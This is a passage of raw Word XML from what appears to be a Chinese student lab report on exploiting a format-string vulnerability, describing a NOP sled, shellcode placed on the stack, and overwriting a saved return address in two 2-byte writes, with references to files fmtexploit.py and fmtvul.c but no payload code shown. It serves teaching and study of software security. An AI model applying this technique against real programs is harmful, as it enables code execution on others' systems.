      <w:del w:id="177" w:author="zhao ruizhi" w:date="2023-05-08T15:32:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:delText>问题②：</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="36966D3F" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="af2"/>
        <w:numPr>
          <w:ilvl w:val="255"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLineChars="200" w:firstLine="420"/>
        <w:rPr>
          <w:del w:id="178" w:author="zhao ruizhi" w:date="2023-05-08T15:32:00Z"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="179" w:author="zhao ruizhi" w:date="2023-05-08T15:32:00Z">
        <w:r>
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:drawing>
            <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2DE0EF28" wp14:editId="2943A707">
              <wp:extent cx="5274310" cy="303530"/>
              <wp:effectExtent l="0" t="0" r="889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7"/>
                      <a:srcRect t="41251" b="30006"/>
                      <a:stretch>
                        <a:fillRect/>
                      </a:stretch>
                    </pic:blipFill>
                    <pic:spPr>
                      <a:xfrm>
                        <a:off x="0" y="0"/>
                        <a:ext cx="5274310" cy="303530"/>
                      </a:xfrm>
                      <a:prstGeom prst="rect">
                        <a:avLst/>
                      </a:prstGeom>
                    </pic:spPr>
                  </pic:pic>
                </a:graphicData>
              </a:graphic>
            </wp:inline>
          </w:drawing>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="43E9CEF8" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="af2"/>
        <w:numPr>
          <w:ilvl w:val="255"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLineChars="200" w:firstLine="480"/>
        <w:rPr>
          <w:del w:id="180" w:author="zhao ruizhi" w:date="2023-05-08T15:32:00Z"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="181" w:author="zhao ruizhi" w:date="2023-05-08T15:32:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:delText>问题③：</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="7BB5EC10" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="af2"/>
        <w:numPr>
          <w:ilvl w:val="255"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLineChars="200" w:firstLine="420"/>
        <w:rPr>
          <w:del w:id="182" w:author="zhao ruizhi" w:date="2023-05-08T15:32:00Z"/>
          <w:rFonts w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="183" w:author="zhao ruizhi" w:date="2023-05-08T15:32:00Z">
        <w:r>
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:drawing>
            <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="236B74B0" wp14:editId="6C683FCE">
              <wp:extent cx="5245735" cy="455295"/>
              <wp:effectExtent l="0" t="0" r="1206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rcRect r="-13" b="50815"/>
                      <a:stretch>
                        <a:fillRect/>
                      </a:stretch>
                    </pic:blipFill>
                    <pic:spPr>
                      <a:xfrm>
                        <a:off x="0" y="0"/>
                        <a:ext cx="5245735" cy="455295"/>
                      </a:xfrm>
                      <a:prstGeom prst="rect">
                        <a:avLst/>
                      </a:prstGeom>
                    </pic:spPr>
                  </pic:pic>
                </a:graphicData>
              </a:graphic>
            </wp:inline>
          </w:drawing>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="0D2E1834" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3"/>
        </w:numPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="黑体" w:hAnsi="Times New Roman"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="黑体" w:hAnsi="Times New Roman" w:hint="eastAsia"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>利用格式化字符串漏洞注入恶意代码</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C633611"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实验内容</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="451E0656" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:p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利用格式化字符串漏洞令有漏洞的程序运行注入的恶意代码。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BE5FB1E"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t>实验指导</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30DF7AA0" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:p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为了利用格式化字符串漏洞注入恶意代码，需要应对</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
          <w:lang w:bidi="en-US"/>
        </w:rPr>
        <w:t>4</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
          <w:lang w:bidi="en-US"/>
        </w:rPr>
        <w:t>个挑战：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="087025F8" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="9"/>
        </w:num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注入恶意代码到</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
          <w:lang w:bidi="en-US"/>
        </w:rPr>
        <w:t>栈</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
          <w:lang w:bidi="en-US"/>
        </w:rPr>
        <w:t>中；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="516D4667" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="9"/>
        </w:num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lastRenderedPageBreak/>
        <w:t>找到恶意代码的起始地址</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
          <w:lang w:bidi="en-US"/>
        </w:rPr>
        <w:t>A</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
          <w:lang w:bidi="en-US"/>
        </w:rPr>
        <w:t>；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6832B6CE" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="9"/>
        </w:num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找到返回地址保存的位置</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
          <w:lang w:bidi="en-US"/>
        </w:rPr>
        <w:t>B</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
          <w:lang w:bidi="en-US"/>
        </w:rPr>
        <w:t>；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C9BF16C" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="9"/>
        </w:num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把</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
          <w:lang w:bidi="en-US"/>
        </w:rPr>
        <w:t>A</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
          <w:lang w:bidi="en-US"/>
        </w:rPr>
        <w:t>写入</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
          <w:lang w:bidi="en-US"/>
        </w:rPr>
        <w:t>B</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
          <w:lang w:bidi="en-US"/>
        </w:rPr>
        <w:t>的内存。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0589AE5B" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:p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对于挑战①，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
          <w:lang w:bidi="en-US"/>
        </w:rPr>
        <w:t>3</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
          <w:lang w:bidi="en-US"/>
        </w:rPr>
        <w:t>.3</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
          <w:lang w:bidi="en-US"/>
        </w:rPr>
        <w:t>中</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
          <w:lang w:bidi="en-US"/>
        </w:rPr>
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
          <w:lang w:bidi="en-US"/>
        </w:rPr>
        <w:t>mtexploit.py</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
          <w:lang w:bidi="en-US"/>
        </w:rPr>
        <w:t>已经构造好的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
          <w:lang w:bidi="en-US"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
          <w:lang w:bidi="en-US"/>
        </w:rPr>
        <w:t>hellcode</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
          <w:lang w:bidi="en-US"/>
        </w:rPr>
        <w:t>，挑战②和③则在</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
          <w:lang w:bidi="en-US"/>
        </w:rPr>
        <w:t>3</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
          <w:lang w:bidi="en-US"/>
        </w:rPr>
        <w:t>.3</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
          <w:lang w:bidi="en-US"/>
        </w:rPr>
        <w:t>节</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
          <w:lang w:bidi="en-US"/>
        </w:rPr>
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
          <w:lang w:bidi="en-US"/>
        </w:rPr>
        <w:t>mtvul.c</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
          <w:lang w:bidi="en-US"/>
        </w:rPr>
        <w:t>中有所提示，接下来需要利用第</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
          <w:lang w:bidi="en-US"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
          <w:lang w:bidi="en-US"/>
        </w:rPr>
        <w:t>节中的内容来完成挑战④。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DF27EC0" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:p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如图</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
          <w:lang w:bidi="en-US"/>
        </w:rPr>
        <w:t>7</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
          <w:lang w:bidi="en-US"/>
        </w:rPr>
        <w:t>所示，我们首先使用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
          <w:lang w:bidi="en-US"/>
        </w:rPr>
        <w:t>0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
          <w:lang w:bidi="en-US"/>
        </w:rPr>
        <w:t>x90</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
          <w:lang w:bidi="en-US"/>
        </w:rPr>
        <w:t>来填充要构造的恶意输入，这样只要跳转到其中一个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
          <w:lang w:bidi="en-US"/>
        </w:rPr>
        <w:t>N</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
          <w:lang w:bidi="en-US"/>
        </w:rPr>
        <w:t>OP</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
          <w:lang w:bidi="en-US"/>
        </w:rPr>
        <w:t>，就能最终到达恶意代码。在本次实验中，选择数据偏移量</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
          <w:lang w:bidi="en-US"/>
        </w:rPr>
        <w:t>0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
          <w:lang w:bidi="en-US"/>
        </w:rPr>
        <w:t>x90</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
          <w:lang w:bidi="en-US"/>
        </w:rPr>
        <w:t>的地方，因此我们要将地址</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
          <w:lang w:bidi="en-US"/>
        </w:rPr>
        <w:t>array_addr+0x90</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
          <w:lang w:bidi="en-US"/>
        </w:rPr>
        <w:t>写入到返回地址域中，覆盖掉原返回地址</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
          <w:lang w:bidi="en-US"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
          <w:lang w:bidi="en-US"/>
        </w:rPr>
        <w:t>rg_addr</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
          <w:lang w:bidi="en-US"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AF54D3D" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLineChars="200" w:firstLine="480"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
          <w:lang w:bidi="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
          <w:lang w:bidi="en-US"/>
        </w:rPr>
        <w:t>为了能够在短时间内覆盖返回地址，我们将</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
          <w:lang w:bidi="en-US"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
          <w:lang w:bidi="en-US"/>
        </w:rPr>
        <w:t>et_addr</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
          <w:lang w:bidi="en-US"/>
        </w:rPr>
        <w:t>分成连续的两个两字节内存块，利用构造好的格式化字符串分别向</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
          <w:lang w:bidi="en-US"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
          <w:lang w:bidi="en-US"/>
        </w:rPr>
        <w:t>et_addr</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
          <w:lang w:bidi="en-US"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
          <w:lang w:bidi="en-US"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
          <w:lang w:bidi="en-US"/>
        </w:rPr>
        <w:t>et_addr+2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
          <w:lang w:bidi="en-US"/>
        </w:rPr>
        <w:t>写入</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
          <w:lang w:bidi="en-US"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
          <w:lang w:bidi="en-US"/>
        </w:rPr>
        <w:t>rray+0x90</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
          <w:lang w:bidi="en-US"/>
        </w:rPr>
        <w:t>的低</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
          <w:lang w:bidi="en-US"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
          <w:lang w:bidi="en-US"/>
        </w:rPr>
        <w:t>字节和高</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
          <w:lang w:bidi="en-US"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
          <w:lang w:bidi="en-US"/>
        </w:rPr>
        <w:t>字节。此外，我们还需要确认数组入口与</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
          <w:lang w:bidi="en-US"/>
        </w:rPr>
        <w:t>v</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
          <w:lang w:bidi="en-US"/>
        </w:rPr>
        <w:t>a_list</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
          <w:lang w:bidi="en-US"/>
        </w:rPr>
        <w:t>指针的偏移量，这可以通过试错法来确定。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FA0ED8F" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLineChars="200" w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="7664A0B1" wp14:editId="0D75A502">
            <wp:extent cx="5274310" cy="36652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665220"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BC65CF7" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="宋体" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:bidi="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>图</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:hint="eastAsia"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> </w:instrText>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:hint="eastAsia"/>
        </w:rPr>
        <w:instrText xml:space="preserve">SEQ </w:instrText>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:hint="eastAsia"/>
        </w:rPr>
        <w:instrText>图</w:instrText>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:hint="eastAsia"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> \* ARABIC</w:instrText>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
        </w:rPr>
        <w:instrText xml:space="preserve">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t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
        </w:rPr>
        <w:t>fmtvul</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>的</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
